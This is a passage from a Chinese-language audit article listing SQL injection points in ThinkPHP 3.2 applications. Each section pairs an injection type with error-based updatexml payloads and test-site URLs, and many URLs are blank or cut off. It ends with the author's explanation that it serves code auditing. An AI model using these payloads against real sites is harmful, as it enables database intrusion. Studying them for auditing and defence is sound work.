where updatexml(1,concat(0x7e,(select user())),0) /*  
#### 0x03.5 开发者失误的情况下各种可注入的情况 group注入
url:   
url:
user())),0)  
#### 0x03.6 开发者失误的情况下各种可注入的情况 having注入
url:
url:
 and
updatexml(1,concat(0x7e,(select user())),0)  
#### 0x03.7 使用原生还不过滤的情况 query注入
url:  and
updatexml(1,concat(0x7e,(select user())),0)  
#### 0x03.8 使用原生还不过滤的情况 execute注入
url: 
and updatexml(1,concat(0x7e,(select user())),0)  
#### 0x03.9 统计查询外部可控制时造成的注入( Count,Max,Min,Avg,Sum )
) from test
where updatexml(1,concat(0x7e,(select user())),0) -- a  
剩下的几个都是同理
#### 0x04.0 setInc与setDec 外部可控制时将会造成注入
url:  1
WHERE id =1 and updatexml(1,concat(0x7e,(select user())),0) -- a  
### 0x04.1 重点-开发者最容易导致sql注入的地方-WHERE注入
注：这里要很郑重说明提醒一下！  
使用thinkphp 一定要 使用 系统I函数避免直接使用 $_GET $_POST $_COOKIE  
否则不是可能会造成注入，是一定会造成注入的问题！  
外部可控制的参数如果是数字请一定要转整 不是数字是字符的 一定要知道什么情况会转义，什么时候不会。
#### 0x04.1.1 即使使用了I函数也是不讲道理直接日穿型 1
url:
[http://test_thinkphp_3.2.3.test/index.php/Home/Index/whereSqlTest1?id[0]=bind&id[1]=0](http://test_thinkphp_3.2.3.test/index.php/Home/Index/whereSqlTest1?id\[0\]=bind&id\[1\]=0)
and updatexml(1,concat(0x7e,(select user())),0)  
#### 0x04.1.2 即使使用了I函数也是不讲道理直接日穿型 2
只要条件是setField并且 where 中你可以控制的情况，无视框架直接注入即可 : )  
url:
[http://test_thinkphp_3.2.3.test/index.php/Home/Index/whereSqlTest2?id[0]=bind&id[1]=0](http://test_thinkphp_3.2.3.test/index.php/Home/Index/whereSqlTest2?id\[0\]=bind&id\[1\]=0)
and updatexml(1,concat(0x7e,(select user())),0)  
#### 0x04.1.3 即使使用了I函数也是不讲道理直接日穿型 3
一般来说不会有这种写法，但是还是要告诉你们不能这样写,基本上使用了 exp 就是裸奔了，所以没什么好说的。  
url: 
url:
and updatexml(1,concat(0x7e,(select user())),0)
#### 0x04.1.4 即使使用了I函数也是不讲道理直接日穿型 4
url:
)
and updatexml(1,concat(0x7e,(select user())),0)  
#### 0x04.1.5 讲道理型的where 注入
像这种直接 $_GET $_POST $_COOKIE 等等只要能够构造数组进入where 的就可以不用讲什么道理了。直接注就是了，如下是例子  
url:
[http://test_thinkphp_3.2.3.test/index.php/Home/Index/whereSqlTest5?id[0]=exp&id[1]=](http://test_thinkphp_3.2.3.test/index.php/Home/Index/whereSqlTest5?id\[0\]=exp&id\[1\]=)
In (2) and updatexml(1,concat(0x7e,(select user())),0)  
#### 0x04.1.6 save / add 可直接注入的情况
url:
[http://test_thinkphp_3.2.3.test/index.php/Home/Index/saveAddSqlTest?test[0]=exp&test[1]=](http://test_thinkphp_3.2.3.test/index.php/Home/Index/saveAddSqlTest?test\[0\]=exp&test\[1\]=)
1 and updatexml(1,concat(0x7e,(select user())),0)  
#### 0x04.1.7 使用组合查询时的注入方式1 _string注入
url:
user())),0)  
#### 0x04.1.8 使用组合查询时的注入方式2 _query注入
url:
#### 0x04.1.9 使用组合查询时的注入方式3 _complex注入
url: 
and updatexml(1,concat(0x7e,(select user())),0)  
#### 0x05.0 0day thinkphp3.2 find/select/delete注入
url:
user())),0)  
### 0x05 总结
市面上现在主流的php 框架  
thinkphp3.2 thinkphp5 laravel yii CodeIgniter  
这些框架都有优秀，有了他们php才显得那么多彩，而也是有他们，市场上的占有率一直的飙升。  
需要知道的是因为框架本身就没有安全这个概念，大部分的问题都是开发者的代码抒写问题，然后又刚好踩了一下框架的雷区，导致了各种问题。  
而他们又是可能在实际中会遇到的，所以有了本篇文章。当然不是说我天天故意针对tp因为上面我提到的框架，我类似这样的文档我全都整理了一份。
我是真的挺喜欢查看框架的源码的，因为你都不知道 PHP这个行业对框架的依赖有多高。  
所以熟读PHP的框架对于我白盒简直是舒服。因为我可以自己整理出一份关于框架的审计文档。然后在日常审计人家的cms时，只要确定了人家是某个框架做的cms，那么就可以大大的降低我的审计成本。  
因为这时，我只需要先搜索查看开发者是否踩了框架的雷区就可以直接定位到一些漏洞。
最后在此说明一次，我真没有想搞tp，我本身公司也是使用thinkphp
进行项目的开发，导致我对这个框架简直不要太熟，也让我读它的时间最长，而同事包括我也会有时踩到这些雷区导致各位问题的出现，所以才会统计起来。